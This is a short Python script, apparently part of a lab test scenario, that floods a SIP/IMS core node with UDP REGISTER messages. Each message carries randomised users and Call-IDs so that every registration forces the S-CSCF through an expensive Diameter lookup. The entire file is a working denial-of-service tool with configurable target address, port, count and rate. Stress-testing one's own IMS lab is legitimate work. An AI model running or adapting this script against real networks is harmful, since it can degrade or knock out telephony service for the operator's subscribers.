#!/usr/bin/env python3
"""reg_flood.py — V2 sub-escenario 2a (fallback sin SIPp).
REGISTER flood con sockets UDP stdlib: usuarios/Call-ID aleatorios para
forzar al S-CSCF por el camino costoso (Diameter SAR por registro).
Uso: REG_TARGET=172.20.0.6 REG_PORT=6060 REG_COUNT=3000 REG_RATE=200 \
     REG_DOMAIN=ims.mnc070.mcc999.3gppnetwork.org python3 reg_flood.py
"""
import os
import random
import socket
import time

TGT = os.environ.get("REG_TARGET", "172.20.0.6")
PORT = int(os.environ.get("REG_PORT", "6060"))
COUNT = int(os.environ.get("REG_COUNT", "3000"))
RATE = float(os.environ.get("REG_RATE", "200"))
DOMAIN = os.environ.get("REG_DOMAIN", "ims.mnc070.mcc999.3gppnetwork.org")

TPL = (
    "REGISTER sip:%s SIP/2.0\r\n"
    "Via: SIP/2.0/UDP 172.20.0.99:5060;branch=z9hG4bKreg%d\r\n"
    "From: <sip:regflood%d@%s>;tag=%d\r\n"
    "To: <sip:regflood%d@%s>\r\n"
    "Call-ID: regflood-%d@172.20.0.99\r\n"
    "CSeq: 1 REGISTER\r\n"
    "Contact: <sip:regflood%d@172.20.0.99:5060>\r\n"
    "Expires: 3600\r\n"
    "Content-Length: 0\r\n\r\n"
)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    gap = 1.0 / RATE if RATE > 0 else 0
    t0 = time.time()
    for i in range(COUNT):
        u = random.randint(100000, 999999)
        s.sendto((TPL % (DOMAIN, u, u, DOMAIN, u, u, DOMAIN, u, u)).encode(), (TGT, PORT))
        if gap:
            time.sleep(gap)
    dt = time.time() - t0
    print("reg_flood: %d REGISTER a %s:%d en %.1fs (%.0f/s)" % (COUNT, TGT, PORT, dt, COUNT / max(dt, 0.01)))


if __name__ == "__main__":
    main()
